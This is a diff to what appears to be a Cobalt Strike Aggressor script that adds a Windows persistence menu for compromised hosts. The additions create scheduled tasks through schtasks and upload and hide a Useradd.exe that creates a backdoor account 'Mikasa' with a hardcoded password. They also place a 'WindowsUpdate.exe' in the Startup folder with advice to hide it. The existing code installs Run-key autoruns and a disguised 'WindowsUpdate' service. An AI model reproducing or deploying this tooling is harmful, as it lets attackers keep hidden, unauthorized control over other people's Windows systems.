@@ -33,18 +33,29 @@ menu "权限维持" {
 		}
 	}
 	separator();
+	item "计划任务" {
+		$dialog = dialog("Schtasks",%(bid => $1["@"], name => "Mikasa" , backfile => "C:\\Windows\\system32\\cmd.exe" , time => "minute" , modifier => "1"),&schtasks_add);
+		dialog_description($dialog,"通过schatasks定时执行计划任务");
+		drow_text($dialog,"name","任务名称:");
+		drow_text($dialog,"backfile","执行的命令或文件:");
+		drow_combobox($dialog,"time","执行时间:",@("minute","hourly","daily","weekly","monthly"));
+		drow_text($dialog,"modifier","执行周期:");
+		dbutton_action($dialog,"Exploit!");
+		dialog_show($dialog);
+	}
+	separator();
 	item "AutoRun" {
                         $bid = $1['@'];
                         $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
                         dialog_description($Dialog, "Registry Add Boot Start Item");
                         drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
                         drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
-                        drow_text($Dialog, "CallBackFile", "CallBackFile: ");
+                        drow_text($Dialog, "  ", "CallBackFile: ");
                         dbutton_action($Dialog, "Reg");
                         dialog_show($Dialog);
 					}
 	separator();	
-	item "Service"{
+	item "SC创建服务"{
 			             $bid = $1['@'];
 			             $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
 			             dialog_description($Dialog, "Register an executable file as a service");
@@ -53,6 +64,29 @@ menu "权限维持" {
 			             dbutton_action($Dialog, "Install");
 			             dialog_show($Dialog);
 			        }
+
+			        separator();
+			      item "UserAdd" {
+			if(-isadmin $1["@"])
+			{
+				bupload($1["@"],script_resource("./modules/Useradd.exe"));
+				bshell($1["@"],"attrib Useradd.exe +s +h");
+				binput($1["@"],"shell Useradd.exe");
+				bshell($1["@"],"Useradd.exe");
+				blog($1["@"],"User:Mikasa pass:password@123");
+			}
+			else
+			{
+				show_error("Permission Denied!");
+			}
+	}
+
+	item "自启目录" {
+
+			show_message("跟修改注册表一个道理,只是执行的方式不同而已");
+			binput($1["@"],"C:\\Users\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe");
+			blog($1["@"],"自启目录位于： C:\\Users\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\,建议copy过后使用attrib隐藏文件属性")
+	}
 }
 
 sub DCSync_ADD_ACE {
@@ -97,4 +131,10 @@ sub InstallService{
     $Name = $3['SerName'];
     $Path = replace($3['Path'], "\"", "");
     bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+}
+
+sub schtasks_add {
+	$payload = "schtasks /create /tn " . $3["name"]  . " /tr \"" . $3["backfile"] . "\"" . " /sc " . $3["time"] . " /mo " . $3["modifier"];
+	binput($3["bid"],"shell " . $payload);
+	bshell($3["bid"],$payload);
 }
